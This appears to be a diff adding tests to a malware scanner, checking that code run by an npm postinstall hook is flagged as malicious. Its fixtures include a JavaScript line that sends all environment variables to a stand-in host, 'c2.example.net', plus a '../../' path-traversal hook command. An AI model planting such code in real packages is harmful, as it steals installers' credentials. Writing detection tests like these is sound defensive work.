@@ -316,3 +316,59 @@ class TestInstallHookContext:
         )
         result = Scanner(config()).scan(root)
         assert not [f for f in result.findings if f.category is Category.MALICIOUS]
+
+    def test_a_script_a_lifecycle_hook_runs_is_itself_a_hook(self, tmp_path) -> None:
+        """`"postinstall": "node install.js"` means `install.js` executes at
+        install time. Marking only the manifest leaves the code that actually
+        runs scored as ordinary application code, so the same credential read
+        and outbound request reports as merely suspicious purely because it
+        lives one file away from the declaration."""
+        root = tmp_path / "repo"
+        root.mkdir()
+        (root / "package.json").write_text(
+            '{"name": "p", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}',
+            encoding="utf-8",
+        )
+        (root / "install.js").write_text(
+            "const https = require('https');\n"
+            "https.request('https://c2.example.net/i').end(JSON.stringify(process.env));\n",
+            encoding="utf-8",
+        )
+        result = Scanner(config()).scan(root)
+        hooked = [
+            f
+            for f in result.findings
+            if f.category is Category.MALICIOUS and f.location.path == "install.js"
+        ]
+        assert hooked
+
+    def test_a_script_no_hook_runs_is_not_promoted(self, tmp_path) -> None:
+        """The escalation follows the declaration. A file that merely sits
+        beside a manifest has not been shown to run at install time, and
+        promoting it would make every file in a package a hook."""
+        root = tmp_path / "repo"
+        root.mkdir()
+        (root / "package.json").write_text(
+            '{"name": "p", "version": "1.0.0", "scripts": {"test": "jest"}}',
+            encoding="utf-8",
+        )
+        (root / "telemetry.js").write_text(
+            "const https = require('https');\n"
+            "https.request('https://c2.example.net/i').end(JSON.stringify(process.env));\n",
+            encoding="utf-8",
+        )
+        result = Scanner(config()).scan(root)
+        assert not [f for f in result.findings if f.category is Category.MALICIOUS]
+
+    def test_a_command_naming_a_file_outside_the_scan_is_ignored(self, tmp_path) -> None:
+        """The manifest is attacker-controlled text. Resolving a path out of it
+        without checking would follow `../../etc/x` out of the tree."""
+        root = tmp_path / "repo"
+        root.mkdir()
+        (root / "package.json").write_text(
+            '{"name": "p", "version": "1.0.0", '
+            '"scripts": {"postinstall": "node ../../outside.js"}}',
+            encoding="utf-8",
+        )
+        result = Scanner(config()).scan(root)
+        assert result.findings is not None
